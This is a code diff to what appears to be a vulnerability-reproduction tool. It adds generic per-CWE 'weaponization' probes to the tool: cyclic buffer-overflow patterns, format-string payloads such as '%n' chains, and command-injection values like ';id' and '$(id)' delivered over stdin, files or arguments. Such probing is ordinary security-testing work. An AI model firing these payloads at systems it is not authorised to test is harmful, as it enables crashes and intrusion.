@@ -54,10 +54,59 @@ _TRIGGERS = {
 
 
 def for_cve(cve: str):
-    """The Trigger for a CVE id, or None when none is authored."""
+    """The hand-authored Trigger for a CVE id, or None when none is authored."""
     fn = _TRIGGERS.get((cve or "").upper())
     return fn() if fn else None
 
 
 def available() -> set:
     return set(_TRIGGERS)
+
+
+# ------------------------------------------------------------- generic CWE-class weaponization
+# When a matched CVE has no bespoke trigger, its CWE still says WHAT KIND of flaw it is, which
+# gives a best-effort input to try: a long cyclic payload for a buffer overflow, format
+# specifiers for a format-string bug, shell metacharacters for a command injection. These are
+# attempts, not guaranteed reproducers -- cve_poc records a result only if the target actually
+# faults -- but they weaponize far more matched CVEs than hand-authoring alone.
+def _cyclic(n: int) -> bytes:
+    """A de Bruijn-ish cyclic pattern so a smashed return address is recognisable in a dump."""
+    out = bytearray()
+    a, b, c = 0x41, 0x61, 0x30
+    while len(out) < n:
+        out += bytes([a, b, c, 0x2e])
+        c += 1
+        if c > 0x39:
+            c = 0x30; b += 1
+        if b > 0x7a:
+            b = 0x61; a += 1
+    return bytes(out[:n])
+
+
+_OVERFLOW_CWES = {"CWE-787", "CWE-121", "CWE-120", "CWE-119", "CWE-122", "CWE-125", "CWE-124",
+                  "CWE-190", "CWE-131", "CWE-416", "CWE-788", "CWE-126"}
+_FMT_CWES = {"CWE-134"}
+_CMDI_CWES = {"CWE-78", "CWE-77"}
+
+
+def class_triggers(cwe: str) -> list:
+    """Best-effort Triggers implied by a CWE class (no specific CVE needed). Fed over stdin/file/
+    arg; recorded only on a real fault."""
+    cwe = (cwe or "").upper()
+    out = []
+    if cwe in _OVERFLOW_CWES:
+        for n in (256, 1024, 4096, 16384):
+            for ch in ("stdin", "file", "arg"):
+                out.append(Trigger(cve=f"class:{cwe}", data=_cyclic(n), channel=ch, cwe=cwe,
+                                   note=f"generic overflow probe ({n}B cyclic) for {cwe}"))
+    elif cwe in _FMT_CWES:
+        for pat in (b"%n%n%n%n%n%n%n%n", b"%p" * 32, b"%s%s%s%s%s%s", b"%99999$n"):
+            for ch in ("stdin", "arg", "file"):
+                out.append(Trigger(cve=f"class:{cwe}", data=pat, channel=ch, cwe=cwe,
+                                   note=f"generic format-string probe for {cwe}"))
+    elif cwe in _CMDI_CWES:
+        for pat in (b";id\n", b"`id`", b"$(id)", b"| id", b"&& id"):
+            for ch in ("arg", "stdin", "file"):
+                out.append(Trigger(cve=f"class:{cwe}", data=pat, channel=ch, cwe=cwe,
+                                   note=f"generic command-injection probe for {cwe}"))
+    return out
